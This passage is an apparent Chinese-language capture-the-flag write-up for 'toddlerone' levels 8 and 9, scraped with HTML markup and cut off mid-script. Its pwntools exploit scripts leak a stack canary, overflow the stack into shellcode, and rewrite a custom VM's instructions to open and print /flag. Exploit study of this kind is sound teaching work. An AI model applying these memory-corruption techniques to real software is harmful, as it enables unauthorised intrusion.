   exit --0x01   read 0x20 write 0x04IMM \x04     a 0x40b 0x01c 0x08i 0x10"""</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level7/shellcode.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level8.1"</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\x04\x01\x40'</span> <span class="token comment"># IMM a= \x01</span>    <span class="token string">b'\x04\xFF\x01'</span> <span class="token comment"># IMM b = \xFF</span>    <span class="token string">b'\x04\x31\x08'</span> <span class="token comment"># IMM c = \x31</span>    <span class="token string">b'\x08\x40\x04'</span> <span class="token comment"># write  返回值是a</span>    <span class="token string">b'\x04\x00\x40'</span> <span class="token comment"># IMM a= \x00</span>    <span class="token string">b'\x04\xFF\x01'</span> <span class="token comment"># IMM b = \xFF</span>    <span class="token string">b'\x04\x21\x08'</span> <span class="token comment"># IMM c = \x21</span>    <span class="token string">b'\x08\x40\x20'</span> <span class="token comment"># read  返回值是a</span>    <span class="token string">b'\x04\xFF\x10'</span> <span class="token comment"># IMM i = \xFF</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your yancode:"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> shellcodep<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>return_print <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 因为yancode中的write 写入的是字节，他没有在最后增加\n，所以readline始终是读不到值的</span><span class="token keyword">print</span><span class="token punctuation">(</span>return_print<span class="token punctuation">)</span>canary_value <span class="token operator">=</span> return_print<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>stack_value  <span class="token operator">=</span> return_print<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'\xFF'</span><span class="token operator">+</span> <span class="token string">b'\xFF'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\xFF'</span><span class="token operator">*</span><span class="token number">8</span>  <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xF8</span> <span class="token operator">-</span><span class="token number">0x410</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level8.0"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""arg1 arg2 op  register values opSYS \x04            exit --0x20   read 0x10 write 0x4IMM \x08     a 0x10b 0x02c 0x08i 0x20"""</span>shellcode_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level7/shellcode.bin"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level8.0"</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\x10\x01\x08'</span> <span class="token comment"># IMM a= \x01</span>    <span class="token string">b'\x02\xFF\x08'</span> <span class="token comment"># IMM b = \xFF</span>    <span class="token string">b'\x08\x31\x08'</span> <span class="token comment"># IMM c = \x31</span>    <span class="token string">b'\x04\x10\x04'</span> <span class="token comment"># write  返回值是a</span>    <span class="token string">b'\x10\x00\x08'</span> <span class="token comment"># IMM a= \x00</span>    <span class="token string">b'\x02\xFF\x08'</span> <span class="token comment"># IMM b = \xFF</span>    <span class="token string">b'\x08\x21\x08'</span> <span class="token comment"># IMM c = \x21</span>    <span class="token string">b'\x10\x10\x04'</span> <span class="token comment"># read  返回值是a</span>    <span class="token string">b'\x20\xFF\x08'</span> <span class="token comment"># IMM i = \xFF</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your yancode:"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> shellcodep<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"[s] ... write\n"</span><span class="token punctuation">)</span>return_print <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>canary_value <span class="token operator">=</span> return_print<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>stack_value  <span class="token operator">=</span> return_print<span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>stack_value <span class="token operator">=</span> u64<span class="token punctuation">(</span>stack_value<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'\xFF'</span><span class="token operator">+</span> <span class="token string">b'\xFF'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>u64<span class="token punctuation">(</span>canary_value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\xFF'</span><span class="token operator">*</span><span class="token number">8</span>  <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_value <span class="token operator">-</span> <span class="token number">0xF8</span> <span class="token operator">-</span><span class="token number">0x410</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>response <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"pwn"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>这一关，不再是使用栈溢出覆盖返回地址劫持控制流了。而是直接复写指令，绕过检查，然后在标准输出中打印 <code>flag</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token triple-quoted-string string">"""/flag  ---> 2f 66 6c 61 67arg1        op      arg2register            valuesyscall a   0x8b   0x20c   0x2d   0x1s   0x10i   0x40f   0x04read    0x2write   0x4open    0x10exit    0x8"""</span><span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">)</span><span class="token punctuation">:</span>    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>    <span class="token keyword">return</span> formatted_data_listelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level9.0"</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\xff'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0xff</span>    <span class="token string">b'\&#123;c&#125;\&#123;imm&#125;\xff'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0xff</span>    <span class="token string">b'\&#123;read&#125;\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b  ,c) ---> return a</span><span class="token punctuation">]</span><span class="token comment"># Operation: stm=128, Registers:  a=64, b=2, c=4, sys: read=8, write=16, open=4</span>payload_1 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x01</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x02</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\xff'</span>             <span class="token comment"># 填充FF位置</span>    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第1条指令</span>    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第2条指令</span>    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第3条指令</span>    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第4条指令</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x2f'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x2f</span>    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x66'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x66</span>    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x02'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x02</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x6c'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x6c</span>    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x03'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x03</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x61'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x61</span>    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x04'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x04</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x67'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x67</span>    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x00</span>    <span class="token string">b'\&#123;open&#125;\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># open ---> return a</span>    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;\x10'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x10</span>    <span class="token string">b'\&#123;c&#125;\&#123;imm&#125;\x40'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0x40</span>    <span class="token string">b'\&#123;read&#125;\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b, c) ---> return a</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>    <span class="token string">b'\&#123;write&#125;\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># write(a, b, c) ---> return a</span>    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\x08\&#123;sys&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># exit(a)</span><span class="token punctuation">]</span>payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x01</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x02</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level9.0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>9.1 就是调整一下顺序。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token triple-quoted-string string">"""/flag  ---> 2f 66 6c 61 67imm 0x2stm 0x40sys 0x10op      arg1        arg2        register    value        syscall   a   0x2b   0x40c   0x1d   0x10s   0x20i   0x4f   0x8read    0x08write   0x01open    0x10exit    0x02"""</span><span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">)</span><span class="token punctuation">:</span>    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>sys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>read<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>open_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>stm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>    <span class="token keyword">return</span> formatted_data_listelf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level9.1"</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\xff'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0xff</span>    <span class="token string">b'\&#123;imm&#125;\&#123;c&#125;\xff'</span><span class="token punctuation">,</span> <span class="token comment"># imm c, 0xff</span>    <span class="token string">b'\&#123;sys&#125;\&#123;read&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b  ,c) ---> return a</span><span class="token punctuation">]</span><span class="token comment"># Operation: stm=128, Registers:  a=64, b=2, c=4, sys: read=8, write=16, open=4</span>payload_1 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x8</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\xff'</span>             <span class="token comment"># 填充FF位置</span>    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第1条指令</span>    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第2条指令</span>    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第3条指令</span>    <span class="token string">b'\xff\xff\xff'</span><span class="token punctuation">,</span>    <span class="token comment"># 填充第4条指令</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x00'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x2f'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x2f</span>    <span class="token string">b'\&#123;stm&#125;\&#123;a&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>    <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x01</span>    <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;\x66'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x66</span>    <span class="token 